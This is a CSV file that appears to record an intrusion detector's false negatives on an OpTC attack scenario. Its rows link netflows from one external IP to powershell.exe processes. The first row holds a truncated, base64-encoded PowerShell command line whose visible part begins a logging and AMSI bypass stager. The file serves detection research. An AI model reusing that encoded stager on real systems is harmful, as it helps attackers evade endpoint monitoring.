node_group,node_group_label,operation,type_pair,target_role,src_label,dst_label,attack,short_attack,endpoint_pair,short_endpoint_pair,count,fraction
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53334,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53334 -> subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,netflow 202.6.172.98:443->142.20.57.246:53334 --> powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53339,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53339 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53339 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53283,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53283 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53283 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:49972,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:49972 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:49972 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53280,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53280 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53280 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:50120,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:50120 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:50120 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:49969,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:49969 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:49969 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53337,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53337 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53337 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53275,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53275 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53275 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:49989,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:49989 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:49989 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:50055,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:50055 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:50055 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53284,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53284 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53284 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:49997,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:49997 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:49997 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:50073,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:50073 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:50073 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:50129,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:50129 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:50129 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53347,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53347 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53347 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:49988,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:49988 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:49988 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53331,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53331 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53331 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53309,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53309 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53309 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:49999,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:49999 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:49999 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:50125,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:50125 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:50125 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:50057,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:50057 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:50057 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:49996,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:49996 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:49996 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53305,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53305 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53305 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53301,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53301 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53301 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:50001,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:50001 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:50001 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:49983,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:49983 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:49983 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:49974,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:49974 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:49974 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:50124,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:50124 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:50124 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:49971,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:49971 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:49971 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53279,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53279 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53279 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:50000,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:50000 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:50000 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53282,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53282 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53282 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:50126,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:50126 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:50126 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:50006,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:50006 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:50006 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:49984,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:49984 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:49984 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:51163,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:51163 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:51163 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:49991,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:49991 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:49991 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53370,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53370 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53370 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:49990,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:49990 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:49990 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53281,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53281 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53281 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:50008,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:50008 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:50008 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53265,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53265 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53265 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53361,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53361 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53361 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:50009,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:50009 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:50009 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53310,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53310 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53310 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53278,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53278 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53278 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:49980,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:49980 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:49980 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53302,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53302 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53302 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:49977,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:49977 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:49977 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:49931,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:49931 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:49931 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:53341,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:53341 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:53341 --> v1.0/powershell.exe,1,0.001336898
FN_below_threshold,FN: malicious below threshold,MESSAGE,netflow->subject,src,netflow 202.6.172.98:443->142.20.57.246:49975,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,OPTC h501 attack,Attack 0,netflow 202.6.172.98:443->142.20.57.246:49975 -> subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,netflow 202.6.172.98:443->142.20.57.246:49975 --> v1.0/powershell.exe,1,0.001336898
